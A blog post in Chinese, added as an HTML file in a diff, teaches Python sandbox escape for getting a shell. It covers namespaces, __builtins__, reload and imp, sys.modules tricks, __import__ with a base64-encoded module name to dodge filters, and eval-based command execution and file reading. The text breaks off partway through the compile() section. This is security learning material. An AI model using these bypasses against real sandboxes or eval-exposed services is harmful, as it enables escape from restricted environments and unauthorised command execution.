@@ -1,0 +1,1693 @@
+<!DOCTYPE html>
+
+
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="https://fonts.loli.net/css?family=Lato:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Roboto Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="沙箱逃逸，就是在给我们一个代码执行的环境下，脱离种种过滤、限制，最终getshell的过程">
+<meta property="og:type" content="article">
+<meta property="og:title" content="python沙箱逃逸学习">
+<meta property="og:url" content="http://yoursite.com/2019/07/25/python沙盒逃逸学习/index.html">
+<meta property="og:site_name" content="gtfly">
+<meta property="og:description" content="沙箱逃逸，就是在给我们一个代码执行的环境下，脱离种种过滤、限制，最终getshell的过程">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-07-29T03:03:49.020Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="python沙箱逃逸学习">
+<meta name="twitter:description" content="沙箱逃逸，就是在给我们一个代码执行的环境下，脱离种种过滤、限制，最终getshell的过程">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"right","display":"hide","offset":12,"b2t":false,"scrollpercent":true,"onmobile":true},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeIn","post_body":"fadeIn","coll_header":"fadeIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/07/25/python沙盒逃逸学习/">
+
+
+
+
+
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入查看密码') !== ''){
+                alert('密码不正确,请询问主编大大');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+  <title>python沙箱逃逸学习 | gtfly</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><script> 
+ function GetRandomNum(Min,Max) 
+ { 
+    var Range = Max - Min; 
+    var Rand = Math.random(); 
+    return(Min + Math.round(Rand * Range)); 
+ } 
+ function setSidebarMarginTop (headerOffset) { 
+    return $('#sidebar').css({ 'margin-top': headerOffset }); 
+ } 
+ function getHeaderOffset () { 
+    return $('.header-inner').height() + CONFIG.sidebar.offset; 
+ }
+    window.onload=function() { 
+    var subtitle = "人生如逆旅，我亦是行人。"; 
+    var mytitle = subtitle.split("W"); 
+    var max = mytitle.length-1;
+    var index = GetRandomNum(0,max); 
+    var text = mytitle[index]; 
+    $("#helloTitle").html(text); 
+    var headOffset = getHeaderOffset(); 
+    setSidebarMarginTop(headOffset); 
+// alert(getHeaderOffset()); 
+ }  
+</script>
+
+<div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">gtfly</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">人生如逆旅，我亦是行人。</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-resource">
+          <a href="https://github.com/gtfly?tab=stars" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-star"></i> <br>
+            
+            资源
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-paper-plane"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/25/python沙盒逃逸学习/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="gtfly">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="gtfly">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">python沙箱逃逸学习</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-25T09:38:25+08:00">
+                2019-07-25
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2019-07-29T11:03:49+08:00">
+                2019-07-29
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/python/" itemprop="url" rel="index">
+                    <span itemprop="name">python</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/07/25/python沙盒逃逸学习/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2019/07/25/python沙盒逃逸学习/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>沙箱逃逸，就是在给我们一个代码执行的环境下，脱离种种过滤、限制，最终getshell的过程</p>
+<a id="more"></a>
+<h3 id="0x01-命名空间"><a href="#0x01-命名空间" class="headerlink" title="0x01.命名空间"></a>0x01.命名空间</h3><p>命名空间是名称到对象的映射；按照变量定义的位置，有以下分类：</p>
+<ul>
+<li>Local，局部命名空间，每个函数所拥有的命名空间，记录了函数中定义的所有变量</li>
+<li>Global，全局命名空间，每个模块加载执行时创建的，记录了模块中定义的变量</li>
+<li>Built-in，内建命名空间，任何模块均可访问</li>
+</ul>
+<p>上述三种命名空间的生命周期如下：</p>
+<ul>
+<li>Local，在函数调用时才被创建，当函数返回结果或抛出异常时被删除</li>
+<li>Global，在模块加载时被创建，一直保留到python解释器退出</li>
+<li>Built-in，在python解释器启动时创建，一直保留到python解释器退出</li>
+</ul>
+<p>像<code>len</code>，<code>print</code>这些函数，我们并不需要引入模块而直接可以去调用，因此这些函数都来自内建命名空间</p>
+<h3 id="0x02-dir-函数"><a href="#0x02-dir-函数" class="headerlink" title="0x02.dir()函数"></a>0x02.dir()函数</h3><p>dir()函数没有提供参数时，会返回当前范围内的变量、方法和定义的类型列表：</p>
+<pre><code>Python 2.7.15+ (default, Nov 27 2018, 23:36:35) 
+[GCC 7.3.0] on linux2
+Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
+&gt;&gt;&gt; dir()
+[&apos;__builtins__&apos;, &apos;__doc__&apos;, &apos;__name__&apos;, &apos;__package__&apos;]
+&gt;&gt;&gt; a = 5
+&gt;&gt;&gt; dir()
+[&apos;__builtins__&apos;, &apos;__doc__&apos;, &apos;__name__&apos;, &apos;__package__&apos;, &apos;a&apos;]</code></pre><p>带参数时，会返回参数的属性、方法列表：</p>
+<pre><code>&gt;&gt;&gt; dir([])
+&gt;&gt;&gt; [&apos;__add__&apos;, &apos;__class__&apos;, &apos;__contains__&apos;, &apos;__delattr__&apos;, &apos;__delitem__&apos;, &apos;__delslice__&apos;, &apos;__doc__&apos;, &apos;__eq__&apos;, &apos;__format__&apos;, &apos;__ge__&apos;, &apos;__getattribute__&apos;, &apos;__getitem__&apos;, &apos;__getslice__&apos;, &apos;__gt__&apos;, &apos;__hash__&apos;, &apos;__iadd__&apos;, &apos;__imul__&apos;, &apos;__init__&apos;, &apos;__iter__&apos;, &apos;__le__&apos;, &apos;__len__&apos;, &apos;__lt__&apos;, &apos;__mul__&apos;, &apos;__ne__&apos;, &apos;__new__&apos;, &apos;__reduce__&apos;, &apos;__reduce_ex__&apos;, &apos;__repr__&apos;, &apos;__reversed__&apos;, &apos;__rmul__&apos;, &apos;__setattr__&apos;, &apos;__setitem__&apos;, &apos;__setslice__&apos;, &apos;__sizeof__&apos;, &apos;__str__&apos;, &apos;__subclasshook__&apos;, &apos;append&apos;, &apos;count&apos;, &apos;extend&apos;, &apos;index&apos;, &apos;insert&apos;, &apos;pop&apos;, &apos;remove&apos;, &apos;reverse&apos;, &apos;sort&apos;]</code></pre><p>在没有提供参数时，可以看到<code>__builtins__</code>是作为默认模块出现的，可以查看该模块成分：</p>
+<pre><code>&gt;&gt;&gt; dir(__builtins__)
+[&apos;ArithmeticError&apos;, &apos;AssertionError&apos;, &apos;AttributeError&apos;, &apos;BaseException&apos;, &apos;BufferError&apos;, &apos;BytesWarning&apos;, &apos;DeprecationWarning&apos;, &apos;EOFError&apos;, &apos;Ellipsis&apos;, &apos;EnvironmentError&apos;, &apos;Exception&apos;, &apos;False&apos;, &apos;FloatingPointError&apos;, &apos;FutureWarning&apos;, &apos;GeneratorExit&apos;, &apos;IOError&apos;, &apos;ImportError&apos;, &apos;ImportWarning&apos;, &apos;IndentationError&apos;, &apos;IndexError&apos;, &apos;KeyError&apos;, &apos;KeyboardInterrupt&apos;, &apos;LookupError&apos;, &apos;MemoryError&apos;, &apos;NameError&apos;, &apos;None&apos;, &apos;NotImplemented&apos;, &apos;NotImplementedError&apos;, &apos;OSError&apos;, &apos;OverflowError&apos;, &apos;PendingDeprecationWarning&apos;, &apos;ReferenceError&apos;, &apos;RuntimeError&apos;, &apos;RuntimeWarning&apos;, &apos;StandardError&apos;, &apos;StopIteration&apos;, &apos;SyntaxError&apos;, &apos;SyntaxWarning&apos;, &apos;SystemError&apos;, &apos;SystemExit&apos;, &apos;TabError&apos;, &apos;True&apos;, &apos;TypeError&apos;, &apos;UnboundLocalError&apos;, &apos;UnicodeDecodeError&apos;, &apos;UnicodeEncodeError&apos;, &apos;UnicodeError&apos;, &apos;UnicodeTranslateError&apos;, &apos;UnicodeWarning&apos;, &apos;UserWarning&apos;, &apos;ValueError&apos;, &apos;Warning&apos;, &apos;ZeroDivisionError&apos;, &apos;_&apos;, &apos;__debug__&apos;, &apos;__doc__&apos;, &apos;__import__&apos;, &apos;__name__&apos;, &apos;__package__&apos;, &apos;abs&apos;, &apos;all&apos;, &apos;any&apos;, &apos;apply&apos;, &apos;basestring&apos;, &apos;bin&apos;, &apos;bool&apos;, &apos;buffer&apos;, &apos;bytearray&apos;, &apos;bytes&apos;, &apos;callable&apos;, &apos;chr&apos;, &apos;classmethod&apos;, &apos;cmp&apos;, &apos;coerce&apos;, &apos;compile&apos;, &apos;complex&apos;, &apos;copyright&apos;, &apos;credits&apos;, &apos;delattr&apos;, &apos;dict&apos;, &apos;dir&apos;, &apos;divmod&apos;, &apos;enumerate&apos;, &apos;eval&apos;, &apos;execfile&apos;, &apos;exit&apos;, &apos;file&apos;, &apos;filter&apos;, &apos;float&apos;, &apos;format&apos;, &apos;frozenset&apos;, &apos;getattr&apos;, &apos;globals&apos;, &apos;hasattr&apos;, &apos;hash&apos;, &apos;help&apos;, &apos;hex&apos;, &apos;id&apos;, &apos;input&apos;, &apos;int&apos;, &apos;intern&apos;, &apos;isinstance&apos;, &apos;issubclass&apos;, &apos;iter&apos;, &apos;len&apos;, &apos;license&apos;, &apos;list&apos;, &apos;locals&apos;, &apos;long&apos;, &apos;map&apos;, &apos;max&apos;, &apos;memoryview&apos;, &apos;min&apos;, &apos;next&apos;, &apos;object&apos;, &apos;oct&apos;, &apos;open&apos;, &apos;ord&apos;, &apos;pow&apos;, &apos;print&apos;, &apos;property&apos;, &apos;quit&apos;, &apos;range&apos;, &apos;raw_input&apos;, &apos;reduce&apos;, &apos;reload&apos;, &apos;repr&apos;, &apos;reversed&apos;, &apos;round&apos;, &apos;set&apos;, &apos;setattr&apos;, &apos;slice&apos;, &apos;sorted&apos;, &apos;staticmethod&apos;, &apos;str&apos;, &apos;sum&apos;, &apos;super&apos;, &apos;tuple&apos;, &apos;type&apos;, &apos;unichr&apos;, &apos;unicode&apos;, &apos;vars&apos;, &apos;xrange&apos;, &apos;zip&apos;]
+&gt;&gt;&gt; </code></pre><p>可以看到，里面有很多常用的函数，如<code>__import__</code>、<code>input</code>、<code>open</code>、<code>eval</code>、<code>execfile</code>等，还有很多异常、对象</p>
+<p>因此，除了直接调用上述函数外，还可以用<code>__builtins__.函数</code>的方式调用，如：</p>
+<pre><code>&gt;&gt;&gt; __builtins__.len(&apos;hello&apos;)
+5</code></pre><p>如果把某函数从<code>__builtins__</code>中删除，那么就不能使用该函数了：</p>
+<pre><code>&gt;&gt;&gt; del __builtins__.chr
+&gt;&gt;&gt; chr(1)
+Traceback (most recent call last):
+  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
+NameError: name &apos;chr&apos; is not defined</code></pre><p>但是，<code>__builtins__</code>模块下有个<code>reload()</code>函数(python2)，该函数可以重新载入之前载入的模块：</p>
+<pre><code>&gt;&gt;&gt; reload(__builtins__)
+&lt;module &apos;__builtin__&apos; (built-in)&gt;
+&gt;&gt;&gt; chr(1)
+&apos;\x01&apos;</code></pre><p>如果把<code>__builtins__</code>模块下的reload删掉，那么就不能直接使用reload()函数了；但是，有个<code>imp</code>模块，它也提供了reload()方法。例如，python3.6下的<code>__builtins__</code>是没有reload的，可以用imp下的reload：</p>
+<pre><code>&gt;&gt;&gt; import os
+&gt;&gt;&gt; import imp
+&gt;&gt;&gt; imp.reload(os)
+&lt;module &apos;os&apos; from &apos;/usr/lib/python3.6/os.py&apos;&gt;</code></pre><h3 id="0x03-import、-import-、importlib库"><a href="#0x03-import、-import-、importlib库" class="headerlink" title="0x03.import、_import_()、importlib库"></a>0x03.import、_<em>import_</em>()、importlib库</h3><h4 id="import"><a href="#import" class="headerlink" title="import"></a>import</h4><p><code>import</code>是一个关键字，通过下面这条命令可以看出：</p>
+<pre><code>&gt;&gt;&gt; help(&apos;keywords&apos;)
+
+Here is a list of the Python keywords.  Enter any keyword to get more help.
+
+and                 elif                if                  print
+as                  else                import              raise
+assert              except              in                  return
+break               exec                is                  try
+class               finally             lambda              while
+continue            for                 not                 with
+def                 from                or                  yield
+del                 global              pass                </code></pre><p>import可以用来导入一个包，在模块导入的时候，默认在当前目录下查找，然后再在系统中查找，系统查找的范围是<code>sys.path</code>下的所有路径：</p>
+<pre><code>&gt;&gt;&gt; import sys
+&gt;&gt;&gt; sys.path
+[&apos;&apos;, &apos;/usr/lib/python2.7&apos;, &apos;/usr/lib/python2.7/plat-x86_64-linux-gnu&apos;, &apos;/usr/lib/python2.7/lib-tk&apos;, &apos;/usr/lib/python2.7/lib-old&apos;, &apos;/usr/lib/python2.7/lib-dynload&apos;, &apos;/home/gtfly/.local/lib/python2.7/site-packages&apos;, &apos;/usr/local/lib/python2.7/dist-packages&apos;, &apos;/usr/lib/python2.7/dist-packages&apos;, &apos;/usr/lib/python2.7/dist-packages/gtk-2.0&apos;]</code></pre><p>import的本质是：</p>
+<ul>
+<li>搜索modules</li>
+<li>绑定到局部变量</li>
+</ul>
+<p><code>import module_name</code>实质是将<code>module_name.py</code>中的全部代码加载到内存并赋值给与模块同名的变量写在当前文件中，这个变量的类型是<code>module</code>：</p>
+<pre><code>&gt;&gt;&gt; import os
+&gt;&gt;&gt; type(os)
+&lt;type &apos;module&apos;&gt;</code></pre><p>sys.modules是一个全局字典，每导入新的模块，sys.modules将自动记录该模块，当第二次再导入该模块时，python会直接到该字典中去查找：</p>
+<pre><code>&gt;&gt;&gt; sys.modules
+&gt;&gt;&gt; {&apos;copy_reg&apos;: &lt;module &apos;copy_reg&apos; from &apos;/usr/lib/python2.7/copy_reg.pyc&apos;&gt;, &apos;sre_compile&apos;: &lt;module &apos;sre_compile&apos; from &apos;/usr/lib/python2.7/sre_compile.pyc&apos;&gt;, &apos;_sre&apos;: &lt;module &apos;_sre&apos; (built-in)&gt;, &apos;encodings&apos;: &lt;module &apos;encodings&apos; from &apos;/usr/lib/python2.7/encodings/__init__.pyc&apos;&gt;, &apos;site&apos;: &lt;module &apos;site&apos; from &apos;/usr/lib/python2.7/site.pyc&apos;&gt;, &apos;__builtin__&apos;: &lt;module &apos;__builtin__&apos; (built-in)&gt;, &apos;sysconfig&apos;: &lt;module &apos;sysconfig&apos; from &apos;/usr/lib/python2.7/sysconfig.pyc&apos;&gt;, &apos;__main__&apos;: &lt;module &apos;__main__&apos; (built-in)&gt;, &apos;encodings.encodings&apos;: None, &apos;abc&apos;: &lt;module &apos;abc&apos; from &apos;/usr/lib/python2.7/abc.pyc&apos;&gt;, &apos;posixpath&apos;: &lt;module &apos;posixpath&apos; from &apos;/usr/lib/python2.7/posixpath.pyc&apos;&gt;, &apos;_weakrefset&apos;: &lt;module &apos;_weakrefset&apos; from &apos;/usr/lib/python2.7/_weakrefset.pyc&apos;&gt;, &apos;errno&apos;: &lt;module &apos;errno&apos; (built-in)&gt;, &apos;encodings.codecs&apos;: None, &apos;sre_constants&apos;: &lt;module &apos;sre_constants&apos; from &apos;/usr/lib/python2.7/sre_constants.pyc&apos;&gt;, &apos;re&apos;: &lt;module &apos;re&apos; from &apos;/usr/lib/python2.7/re.pyc&apos;&gt;, &apos;_abcoll&apos;: &lt;module &apos;_abcoll&apos; from &apos;/usr/lib/python2.7/_abcoll.pyc&apos;&gt;, &apos;types&apos;: &lt;module &apos;types&apos; from &apos;/usr/lib/python2.7/types.pyc&apos;&gt;, &apos;_codecs&apos;: &lt;module &apos;_codecs&apos; (built-in)&gt;, &apos;encodings.__builtin__&apos;: None, &apos;_warnings&apos;: &lt;module &apos;_warnings&apos; (built-in)&gt;, &apos;genericpath&apos;: &lt;module &apos;genericpath&apos; from &apos;/usr/lib/python2.7/genericpath.pyc&apos;&gt;, &apos;stat&apos;: &lt;module &apos;stat&apos; from &apos;/usr/lib/python2.7/stat.pyc&apos;&gt;, &apos;zipimport&apos;: &lt;module &apos;zipimport&apos; (built-in)&gt;, &apos;_sysconfigdata&apos;: &lt;module &apos;_sysconfigdata&apos; from &apos;/usr/lib/python2.7/_sysconfigdata.pyc&apos;&gt;, &apos;warnings&apos;: &lt;module &apos;warnings&apos; from &apos;/usr/lib/python2.7/warnings.pyc&apos;&gt;, &apos;UserDict&apos;: &lt;module &apos;UserDict&apos; from &apos;/usr/lib/python2.7/UserDict.pyc&apos;&gt;, &apos;encodings.utf_8&apos;: &lt;module &apos;encodings.utf_8&apos; from &apos;/usr/lib/python2.7/encodings/utf_8.pyc&apos;&gt;, &apos;sys&apos;: &lt;module &apos;sys&apos; (built-in)&gt;, &apos;codecs&apos;: &lt;module &apos;codecs&apos; from &apos;/usr/lib/python2.7/codecs.pyc&apos;&gt;, &apos;readline&apos;: &lt;module &apos;readline&apos; from &apos;/usr/lib/python2.7/lib-dynload/readline.x86_64-linux-gnu.so&apos;&gt;, &apos;_sysconfigdata_nd&apos;: &lt;module &apos;_sysconfigdata_nd&apos; from &apos;/usr/lib/python2.7/plat-x86_64-linux-gnu/_sysconfigdata_nd.pyc&apos;&gt;, &apos;os.path&apos;: &lt;module &apos;posixpath&apos; from &apos;/usr/lib/python2.7/posixpath.pyc&apos;&gt;, &apos;_locale&apos;: &lt;module &apos;_locale&apos; (built-in)&gt;, &apos;sitecustomize&apos;: &lt;module &apos;sitecustomize&apos; from &apos;/usr/lib/python2.7/sitecustomize.pyc&apos;&gt;, &apos;signal&apos;: &lt;module &apos;signal&apos; (built-in)&gt;, &apos;traceback&apos;: &lt;module &apos;traceback&apos; from &apos;/usr/lib/python2.7/traceback.pyc&apos;&gt;, &apos;linecache&apos;: &lt;module &apos;linecache&apos; from &apos;/usr/lib/python2.7/linecache.pyc&apos;&gt;, &apos;posix&apos;: &lt;module &apos;posix&apos; (built-in)&gt;, &apos;encodings.aliases&apos;: &lt;module &apos;encodings.aliases&apos; from &apos;/usr/lib/python2.7/encodings/aliases.pyc&apos;&gt;, &apos;exceptions&apos;: &lt;module &apos;exceptions&apos; (built-in)&gt;, &apos;sre_parse&apos;: &lt;module &apos;sre_parse&apos; from &apos;/usr/lib/python2.7/sre_parse.pyc&apos;&gt;, &apos;os&apos;: &lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt;, &apos;_weakref&apos;: &lt;module &apos;_weakref&apos; (built-in)&gt;}</code></pre><p>现在设置一下modules中<code>os</code>的值为None：</p>
+<pre><code>&gt;&gt;&gt; sys.modules[&apos;os&apos;] = None
+&gt;&gt;&gt; import os
+&gt;&gt;&gt; Traceback (most recent call last):
+&gt;&gt;&gt;   File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
+&gt;&gt;&gt; ImportError: No module named os</code></pre><p>发现把os从<code>modules</code>中删去就不能直接引入了；但是，我们可以接着设置<code>os</code>的模块的路径，从而引入该模块：</p>
+<pre><code>&gt;&gt;&gt; sys.modules[&apos;os&apos;] = &apos;/usr/lib/python2.7/os.py&apos;
+&gt;&gt;&gt; import os
+&gt;&gt;&gt; </code></pre><p>如果sys模块也不能用，那么就不能通过设置路径来重新引入模块了，但可以使用python的内建函数：</p>
+<ul>
+<li>execfile：execfile() 函数可以用来执行一个文件(python2)</li>
+<li>exec：执行存储在字符串或文件中的python语句；python2的exec是一个内置语句而不是函数；python3将python2中的exec和execfile()功能整合到一个exec()函数中了</li>
+</ul>
+<p>例如(python2)：</p>
+<pre><code>&gt;&gt;&gt; execfile(&apos;/usr/lib/python2.7/os.py&apos;)
+&gt;&gt;&gt; system(&apos;ls /&apos;)</code></pre><p>或者：</p>
+<pre><code>&gt;&gt;&gt; exec open(&apos;/usr/lib/python2.7/os.py&apos;)
+&gt;&gt;&gt; system(&apos;ls　/&apos;)</code></pre><h4 id="import-1"><a href="#import-1" class="headerlink" title="_import_()"></a>_<em>import_</em>()</h4><p><code>__import__</code>与<code>import</code>是有区别的，<code>__import__()</code>是一个函数，而不是关键字；</p>
+<p><code>__import__</code>只做了一件事：搜索modules；import执行过程是调用<code>__import__</code>来完成模块检索的</p>
+<p><code>__import__</code>作为一个函数，只能接受字符串参数，返回值可以直接用来操作；通常在动态加载的时候用到这个函数：</p>
+<pre><code>&gt;&gt;&gt; __import__(&apos;re&apos;).findall(&apos;(hi)&apos;, &apos;hilinghi&apos;)
+[&apos;hi&apos;, &apos;hi&apos;]
+&gt;&gt;&gt; </code></pre><p>因此，如果沙箱对导入的包名称做了限制，我们可以在导入模块前先对模块名称做处理，如：</p>
+<pre><code>&gt;&gt;&gt; &apos;os&apos;.encode(&apos;base64&apos;)
+&apos;b3M=\n&apos;
+&gt;&gt;&gt; a = __import__(&apos;b3M=\n&apos;.decode(&apos;base64&apos;))
+&gt;&gt;&gt; a.chdir(&apos;../&apos;)
+&gt;&gt;&gt; a.getcwd()
+&apos;/home&apos;</code></pre><h4 id="importlib"><a href="#importlib" class="headerlink" title="importlib"></a>importlib</h4><p><code>importlib</code>模块是对<code>import</code>和<code>__import__()</code>的补充；它也可以通过传入字符串来引入一个模块</p>
+<pre><code>&gt;&gt;&gt; import importlib
+&gt;&gt;&gt; a = importlib.import_module(&apos;os&apos;)
+&gt;&gt;&gt; a.chdir(&apos;../&apos;)
+&gt;&gt;&gt; </code></pre><h3 id="0x04-python中的高危函数、方法"><a href="#0x04-python中的高危函数、方法" class="headerlink" title="0x04.python中的高危函数、方法"></a>0x04.python中的高危函数、方法</h3><h4 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h4><p>eval()函数用来执行一个字符串表达式，并返回表达式的值；如果表达式中的值是我们可控的话，那么可以做很多事，如：</p>
+<p>获取文件内容：</p>
+<pre><code>&gt;&gt;&gt; eval(&quot;open(&apos;/var/www/html/index.php&apos;).read()&quot;)
+&quot;&lt;?php\n\necho $_GET[&apos;a&apos;];\n&quot;
+&gt;&gt;&gt; </code></pre><p>引入模块：</p>
+<pre><code>&gt;&gt;&gt; eval(&quot;__import__(&apos;os&apos;).system(&apos;ls /&apos;)&quot;)
+bin    dev   initrd.img      lib64     mnt   root  snap  tmp    </code></pre><p>这里要注意，eval()的参数类型除了是字符串外，还可以是其他类型；先来了解一下compile()函数的用法：</p>
+<p>compile()函数可以将一个字符串编译为字节代码，语法为：</p>
+<pre><code>compile(source, filename, mode[, flags[, dont_inherit]])</code></pre><p>参数</p>
+<ul>
+<li>source – 字符串或者AST（Abstract Syntax Trees）对象。。</li>
+<li>filename – 代码文件名称，如果不是从文件读取代码则传递一些可辨认的值。</li>
+<li>mode – 指定编译代码的种类。可以指定为 exec, eval, single。</li>
+<li>flags – 变量作用域，局部命名空间，如果被提供，可以是任何映射对象。。</li>
+<li>flags和dont_inherit是用来控制编译源码时的标志</li>
+</ul>
+<p>例如：</p>
+<pre><code>&gt;&gt;&gt; a = compile(&quot;open(&apos;/var/www/html/index.php&apos;).read()&quot;, &apos;&apos;, &apos;eval&apos;)
+&gt;&gt;&gt; type(a)
+&lt;type &apos;code&apos;&gt;
